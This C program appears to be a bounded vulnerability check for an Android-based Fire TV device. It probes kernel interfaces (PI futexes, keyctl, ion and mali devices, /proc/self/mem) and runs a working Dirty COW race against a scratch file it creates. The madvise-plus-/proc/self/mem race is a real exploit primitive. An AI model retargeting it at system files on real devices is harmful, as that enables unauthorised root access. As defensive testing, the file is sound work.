/* Capability checks and a bounded Dirty COW reproduction on a disposable file.
 * No system files, privilege changes, kernel corruption primitives, or reboots.
 * A negative race result is NOT proof that a kernel is patched.
 */
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static atomic_int stop_flag;
static atomic_ulong madvise_ok, write_ok;
static int last_write_error;
static char *mapping;
static size_t page_size;
static int mem_fd;
static const char marker[] = "COWCHECK";

static void *discard_private_page(void *unused) {
    (void)unused;
    for (unsigned i = 0; i < 150000 && !atomic_load(&stop_flag); ++i) {
        if (madvise(mapping, page_size, MADV_DONTNEED) == 0)
            atomic_fetch_add(&madvise_ok, 1);
    }
    return NULL;
}

static void *write_private_mapping(void *unused) {
    (void)unused;
    for (unsigned i = 0; i < 150000 && !atomic_load(&stop_flag); ++i) {
        ssize_t n = pwrite(mem_fd, marker, sizeof(marker) - 1,
                           (off_t)(uintptr_t)mapping);
        if (n == sizeof(marker) - 1) atomic_fetch_add(&write_ok, 1);
        else last_write_error = errno;
    }
    return NULL;
}

static void report_open(const char *path, int mode) {
    errno = 0;
    int fd = open(path, mode | O_CLOEXEC);
    printf("open %s: %s (errno=%d)\n", path,
           fd >= 0 ? "allowed" : strerror(errno), fd >= 0 ? 0 : errno);
    if (fd >= 0) close(fd);
}

static void cow_check(void) {
    char scratch[] = "/data/local/tmp/firetv-cow-check-XXXXXX";
    int fd = mkstemp(scratch);
    if (fd < 0) { perror("scratch mkstemp"); return; }
    page_size = (size_t)sysconf(_SC_PAGESIZE);
    char *initial = malloc(page_size);
    if (!initial) { close(fd); unlink(scratch); return; }
    memset(initial, 'A', page_size);
    if (write(fd, initial, page_size) != (ssize_t)page_size || fsync(fd) != 0) {
        perror("scratch initialization");
        close(fd); unlink(scratch); free(initial); return;
    }
    close(fd);
    fd = open(scratch, O_RDONLY | O_CLOEXEC);
    if (fd < 0) { perror("readonly scratch open"); unlink(scratch); free(initial); return; }
    mapping = mmap(NULL, page_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mapping == MAP_FAILED) {
        perror("scratch mmap"); close(fd); unlink(scratch); free(initial); return;
    }
    mem_fd = open("/proc/self/mem", O_RDWR | O_CLOEXEC);
    if (mem_fd < 0) {
        printf("Dirty COW scratch test: BLOCKED (/proc/self/mem: %s)\n", strerror(errno));
    } else {
        pthread_t discard, writer;
        atomic_store(&stop_flag, 0);
        int a = pthread_create(&discard, NULL, discard_private_page, NULL);
        int b = a == 0 ? pthread_create(&writer, NULL, write_private_mapping, NULL) : -1;
        if (a == 0 && b == 0) {
            struct timespec duration = {.tv_sec = 2, .tv_nsec = 0};
            nanosleep(&duration, NULL);
            atomic_store(&stop_flag, 1);
            pthread_join(discard, NULL);
            pthread_join(writer, NULL);
            char result[sizeof(marker)] = {0};
            ssize_t got = pread(fd, result, sizeof(marker) - 1, 0);
            printf("Dirty COW scratch test: %s; backing-file-prefix=%.*s; madvise_ok=%lu; pwrite_ok=%lu; last_write_errno=%d\n",
                   got == sizeof(marker) - 1 && memcmp(result, marker, sizeof(marker) - 1) == 0
                       ? "REPRODUCED" : "NOT_REPRODUCED",
                   (int)(sizeof(marker) - 1), result,
                   atomic_load(&madvise_ok), atomic_load(&write_ok), last_write_error);
        } else {
            atomic_store(&stop_flag, 1);
            if (a == 0) pthread_join(discard, NULL);
            printf("Dirty COW scratch test: thread creation failed (%d,%d)\n", a, b);
        }
        close(mem_fd);
    }
    munmap(mapping, page_size);
    close(fd);
    printf("Scratch cleanup: %s\n", unlink(scratch) == 0 ? "removed" : strerror(errno));
    free(initial);
}

int main(void) {
    alarm(12);
    printf("identity: uid=%u euid=%u pointer_bits=%zu\n", getuid(), geteuid(), 8 * sizeof(void *));
    int futex_word = 0;
    errno = 0;
    long locked = syscall(SYS_futex, &futex_word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    printf("uncontended FUTEX_LOCK_PI: result=%ld errno=%d (%s)\n", locked, errno, strerror(errno));
    if (locked == 0) {
        errno = 0;
        long unlocked = syscall(SYS_futex, &futex_word, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
        printf("FUTEX_UNLOCK_PI: result=%ld errno=%d\n", unlocked, errno);
    }
#ifdef SYS_keyctl
    errno = 0;
    long key_result = syscall(SYS_keyctl, 0, -1, 0, 0, 0);
    printf("keyctl availability: result=%ld errno=%d (%s)\n", key_result, errno, strerror(errno));
#endif
    report_open("/dev/ion", O_RDONLY);
    report_open("/dev/mali", O_RDONLY);
    report_open("/proc/self/mem", O_RDWR);
    int ping = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    printf("ICMP datagram socket: %s\n", ping >= 0 ? "allowed" : strerror(errno));
    if (ping >= 0) close(ping);
    cow_check();
    printf("identity after checks: uid=%u euid=%u\n", getuid(), geteuid());
    return 0;
}
